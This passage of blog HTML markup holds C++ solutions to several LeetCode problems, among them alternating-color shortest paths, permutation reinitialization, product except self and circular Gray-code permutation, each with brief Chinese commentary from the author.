class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">bool</span> RED = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">bool</span> BLUE = <span class="literal">false</span>;</span><br><span class="line">    vector&lt;vector&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;&gt;&gt; graph;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; answer;</span><br><span class="line">    vector&lt;map&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;, <span class="type">bool</span>&gt;&gt; visited;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">shortestAlternatingPaths</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; redEdges, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; blueEdges)</span> </span>&#123;</span><br><span class="line">        visited = vector&lt;map&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;, <span class="type">bool</span>&gt;&gt;(n);</span><br><span class="line">        graph = vector&lt;vector&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;&gt;&gt;(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; edge: redEdges) &#123;</span><br><span class="line">            visited[edge[<span class="number">0</span>]][<span class="built_in">make_pair</span>(RED, edge[<span class="number">1</span>])] = <span class="literal">false</span>;</span><br><span class="line">            graph[edge[<span class="number">0</span>]].<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(RED, edge[<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; edge: blueEdges) &#123;</span><br><span class="line">            visited[edge[<span class="number">0</span>]][<span class="built_in">make_pair</span>(BLUE, edge[<span class="number">1</span>])] = <span class="literal">false</span>;</span><br><span class="line">            graph[edge[<span class="number">0</span>]].<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(BLUE, edge[<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        answer = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, INT_MAX);</span><br><span class="line">        <span class="built_in">search</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(answer[i] == INT_MAX) answer[i] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        answer[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> answer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">        queue&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(RED, <span class="number">0</span>));</span><br><span class="line">        q.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(BLUE, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            queue&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;&gt; tmp;</span><br><span class="line">            <span class="keyword">while</span>(!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                <span class="keyword">auto</span> [color, node] = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; edge:graph[node]) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(edge.first != color &amp;&amp; !visited[node][edge]) &#123;</span><br><span class="line">                        answer[edge.second] = <span class="built_in">min</span>(answer[edge.second], len+<span class="number">1</span>);</span><br><span class="line">                        tmp.<span class="built_in">push</span>(edge);</span><br><span class="line">                        visited[node][edge] = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            len++;</span><br><span class="line">            q = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>不必重复遍历边<br>由于自环，平行边的存在，同一个节点可以重复遍历，这样可以凑出红蓝交替的路径<br>对于边，定义为<code>pair&lt;bool, int&gt;</code>，代表<code>&lt;color, next&gt;</code><br>bfs时，选取与上一条边颜色相反的边入队</p></blockquote><h3 id="dfs"><a href="#dfs" class="headerlink" title="dfs"></a>dfs</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">bool</span> RED = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">bool</span> BLUE = <span class="literal">false</span>;</span><br><span class="line">    vector&lt;vector&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;&gt;&gt; graph;</span><br><span class="line">    vector&lt;map&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;, <span class="type">bool</span>&gt;&gt; visited;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">shortestAlternatingPaths</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; redEdges, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; blueEdges)</span> </span>&#123;</span><br><span class="line">        graph = vector&lt;vector&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;&gt;&gt;(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; edge: redEdges) &#123;</span><br><span class="line">            graph[edge[<span class="number">0</span>]].<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(RED, edge[<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; edge: blueEdges) &#123;</span><br><span class="line">            graph[edge[<span class="number">0</span>]].<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(BLUE, edge[<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">answer</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            visited = vector&lt;map&lt;pair&lt;<span class="type">bool</span>, <span class="type">int</span>&gt;, <span class="type">bool</span>&gt;&gt;(n);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; edge: redEdges) &#123;</span><br><span class="line">                visited[edge[<span class="number">0</span>]][<span class="built_in">make_pair</span>(RED, edge[<span class="number">1</span>])] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; edge: blueEdges) &#123;</span><br><span class="line">                visited[edge[<span class="number">0</span>]][<span class="built_in">make_pair</span>(BLUE, edge[<span class="number">1</span>])] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            answer[i] = <span class="built_in">min</span>(<span class="built_in">search</span>(<span class="number">0</span>, i, <span class="number">0</span>, RED), <span class="built_in">search</span>(<span class="number">0</span>, i, <span class="number">0</span>, BLUE));</span><br><span class="line">            <span class="keyword">if</span>(answer[i] == INT_MAX) answer[i] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> answer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">search</span><span class="params">(<span class="type">int</span> node, <span class="type">int</span> target, <span class="type">int</span> len, <span class="type">bool</span> last_color)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == target) <span class="keyword">return</span> len;</span><br><span class="line">        <span class="type">int</span> find = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; edge : graph[node]) &#123;</span><br><span class="line">            <span class="keyword">if</span>(edge.first != last_color &amp;&amp; !visited[node][edge]) &#123;</span><br><span class="line">                visited[node][edge] = <span class="literal">true</span>;</span><br><span class="line">                find = <span class="built_in">min</span>(<span class="built_in">search</span>(edge.second, target, len+<span class="number">1</span>, edge.first), find);</span><br><span class="line">                visited[node][edge] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> find;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>超时，但应该是正确的<br>复杂度 $ O(n^2) $</p></blockquote><h2 id="1806-还原排列的最少操作步数"><a href="#1806-还原排列的最少操作步数" class="headerlink" title="1806. 还原排列的最少操作步数"></a><a href="https://leetcode.cn/problems/minimum-number-of-operations-to-reinitialize-a-permutation/">1806. 还原排列的最少操作步数</a></h2><h3 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reinitializePermutation</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">arr</span><span class="params">(n)</span>,<span class="title">tmp</span><span class="params">(n)</span>, *x, *y</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arr[i] = i%<span class="number">2</span> == <span class="number">0</span> ? i/<span class="number">2</span> : n/<span class="number">2</span>+(i<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> step = <span class="number">1</span>;</span><br><span class="line">        x = &amp;arr;</span><br><span class="line">        y = &amp;tmp;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="built_in">ok</span>(x)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                (*y)[i] = i%<span class="number">2</span> == <span class="number">0</span> ? (*x)[i/<span class="number">2</span>] : (*x)[n/<span class="number">2</span>+(i<span class="number">-1</span>)/<span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">swap</span>(x, y);</span><br><span class="line">            step++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> step;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">ok</span><span class="params">(vector&lt;<span class="type">int</span>&gt;* arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>((*arr)[i] != i) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="模拟2"><a href="#模拟2" class="headerlink" title="模拟2"></a>模拟2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reinitializePermutation</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">arr</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arr[i] = i%<span class="number">2</span> == <span class="number">0</span> ? i/<span class="number">2</span> : n/<span class="number">2</span>+(i<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> step = <span class="number">1</span>, p = arr[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span>(p != <span class="number">1</span>) &#123;</span><br><span class="line">            p = arr[p];            </span><br><span class="line">            step++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> step;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="238-除自身以外数组的乘积"><a href="#238-除自身以外数组的乘积" class="headerlink" title="238. 除自身以外数组的乘积"></a><a href="https://leetcode.cn/problems/product-of-array-except-self/">238. 除自身以外数组的乘积</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">productExceptSelf</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">l</span><span class="params">(len, <span class="number">1</span>)</span>, <span class="title">r</span><span class="params">(len,<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            l[i] = l[i<span class="number">-1</span>] * nums[i<span class="number">-1</span>];</span><br><span class="line">            r[len-i<span class="number">-1</span>] = r[len-i] * nums[len-i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            nums[i] = l[i]*r[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="空间O-1"><a href="#空间O-1" class="headerlink" title="空间O(1)"></a>空间O(1)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">productExceptSelf</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(len, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            res[len-i<span class="number">-1</span>] = res[len-i] * nums[len-i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            res[i] = left*res[i];</span><br><span class="line">            left *= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>他这里对 $ O(1) $ 的定义是除了输入输出数组外，只用常量级的空间，很容易想到l数组可以优化</p></blockquote><h2 id="2357-使数组中所有元素都等于零"><a href="#2357-使数组中所有元素都等于零" class="headerlink" title="2357. 使数组中所有元素都等于零"></a><a href="https://leetcode.cn/problems/make-array-zero-by-subtracting-equal-amounts/description/">2357. 使数组中所有元素都等于零</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumOperations</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n:nums) &#123;</span><br><span class="line">            <span class="keyword">if</span>(n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                m[n]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ite=m.<span class="built_in">begin</span>(); ite != m.<span class="built_in">end</span>(); ite++,count++);</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1238-循环码排列"><a href="#1238-循环码排列" class="headerlink" title="1238. 循环码排列"></a><a href="https://leetcode.cn/problems/circular-permutation-in-binary-representation/description/">1238. 循环码排列</a></h2><h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">circularPermutation</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="number">1</span> &lt;&lt; n;</span><br><span class="line">        res = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">rotate</span><span class="params">(len)</span></span>;</span><br><span class="line">        <span class="type">int</span> split = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; split; j++) &#123;</span><br><span class="line">                <span class="built_in">cal</span>(len/split*j, len/split*(j+<span class="number">1</span>), a);</span><br><span class="line">                <span class="keyword">if</span>(j%<span class="number">2</span>==<span class="number">0</span>) a = !a;</span><br><span class="line">            &#125;</span><br><span class="line">            split &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(k &lt; len &amp;&amp; res[k] != start) k++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            rotate[i] = res[(i+k)%len];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rotate;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">cal</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; j; i++) &#123;</span><br><span class="line">            res[i] &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            res[i] += a&amp;<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>把他想成一个二叉树，每层按照0110的顺序生成</p></blockquote><h3 id="二叉树1"><a href="#二叉树1" class="headerlink" title="二叉树1"></a>二叉树1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">circularPermutation</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="number">1</span> &lt;&lt; n;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">rotate</span><span class="params">(len)</span></span>;</span><br><span class="line">        </span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            q.<span class="built_in">push</span>(<span class="keyword">new</span> <span class="built_in">TreeNode</span>(i));</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode* root = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode *n1 = q.<span class="built_in">front</span>(), *n2 = <span class="literal">nullptr</span>;</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                n2 = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                q.<span class="built_in">push</span>(<span class="keyword">new</span> <span class="built_in">TreeNode</span>(n1-&gt;val + n2-&gt;val, n1, n2));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                root = n1;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">flip</span>(root);</span><br><span class="line">        <span class="built_in">treavourse</span>(root);</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(k &lt; len &amp;&amp; res[k] != start) k++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            rotate[i] = res[(i+k)%len];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rotate;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">treavourse</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left != <span class="literal">nullptr</span> &amp;&amp; root-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="built_in">treavourse</span>(root-&gt;left);</span><br><span class="line">            <span class="built_in">treavourse</span>(root-&gt;right);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">flip</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left == <span class="literal">nullptr</span> || root-&gt;right == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">swap</span>(root-&gt;right-&gt;left, root-&gt;right-&gt;right);</span><br><span class="line">        <span class="built_in">flip</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">flip</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>翻转二叉树，<code>先序</code>把右孩子的左右孩子互换</p></blockquote><h3 id="格雷码"><a href="#格雷码" class="headerlink" title="格雷码"></a>格雷码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span 